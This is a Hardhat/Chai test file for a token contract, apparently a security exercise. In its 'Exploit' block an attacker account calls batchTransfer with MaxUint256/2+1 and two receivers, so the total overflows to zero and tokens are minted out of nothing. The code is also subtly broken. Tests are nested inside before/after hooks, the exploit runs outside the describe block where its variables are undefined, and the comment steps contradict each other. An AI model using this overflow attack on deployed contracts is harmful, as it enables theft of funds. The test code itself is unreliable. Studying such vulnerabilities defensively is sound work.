const { ethers } = require("hardhat");
const { expect } = require("chai");

// Token Overflow Testing Suite
// This suite of tests is designed to examine the security of the BeyondTheLimitToken smart contract
describe("Token Overflow Testing Suite", function () {
  // Define deployer and attacker as the primary actors in these tests.
  let deployer, attacker;

  // Set the initial supply to 1.70 million tokens
  const INITIAL_SUPPLY = ethers.utils.parseEther("1700000");

  before(async function () {
    // Retrieve the deployer and attacker accounts
    [deployer, attacker] = await ethers.getSigners();

    // Get the contract factory for BeyondTheLimitToken
    const beyondTheLimitTokenFactory = await ethers.getContractFactory(
      "./BeyondTheLimitToken.sol:BeyondTheLimitToken",
      deployer
    );

    // Deploy the BeyondTheLimitToken with the initial supply
    this.token = await beyondTheLimitTokenFactory.deploy(INITIAL_SUPPLY);

    // Fetch initial balances of the attacker and deployer
    let attackerBalance = await this.token.balanceOf(attacker.address);
    let deployerBalance = await this.token.balanceOf(deployer.address);

    // Ensure the attacker's initial balance is 0
    it("[Test I] Should ensure that attacker's initial balance is 0", async function () {
      expect(attackerBalance).to.equal(0);
    });

    // Ensure the deployer's initial balance equals the initial supply
    it("[Test II] Should ensure that deployer's initial balance equals the initial supply", async function () {
      expect(deployerBalance).to.equal(INITIAL_SUPPLY);
    });
  });
});

it("Exploit", async function () {
  /* 
  We will manipulate the batchTransfer function to send tokens to the attacker by exploiting an overflow vulnerability.
        1. The function can be exploited due to 'uint totalAmount = _receivers.length * _value'
        2. We want totalAmount to be 0, so we can send tokens to the attacker, without reducing the balance elsewhere
        3. We can achieve this by setting _receivers.length * _value = 0, given the lack of SafeMath checks 
        4. Regarding _receivers.length, it cannot be 0 as we are passing in an array of addresses
        5. It cannot be 1, because that would make _value = 0, which is not possible given the require statement in the contract
        6. We will consider _receivers.length = 2, and _value = 0
        7. To make value = 0, we can set _value = MAX_UINT256 + 1, but we must consider the _receivers.length = 2
        8. So we will set _value = (MAX_UINT256 / 2 + 1), so that we cancel the multiplication by 2, prior to overflowing 
  */

  // Create the value for _value by dividing the maximum unsigned integer by 2 and adding 1.
  let overflowValue = ethers.constants.MaxUint256.div(2).add(1);

  // Create the array of addresses for _receivers including attacker and deployer.
  let receivers = [attacker.address, deployer.address];

  // Connect as the attacker and call the batchTransfer function, with the above values.
  // This simulates the attacker exploiting the vulnerability.
  await this.token.connect(attacker).batchTransfer(receivers, overflowValue);
});

after(async function () {
  // Fetch the balance of the attacker after the exploit
  let attackerBalanceAfter = await this.token.balanceOf(attacker.address);

  // The success condition of this exploit is that the attacker should end up with a lot of tokens,
  // specifically more than the initial supply, demonstrating that the overflow was successfully triggered.
  it("[Test III] Should confirm that the attacker has more tokens than the initial supply after the exploit", async function () {
    expect(attackerBalanceAfter).to.be.gt(INITIAL_SUPPLY);
  });
});
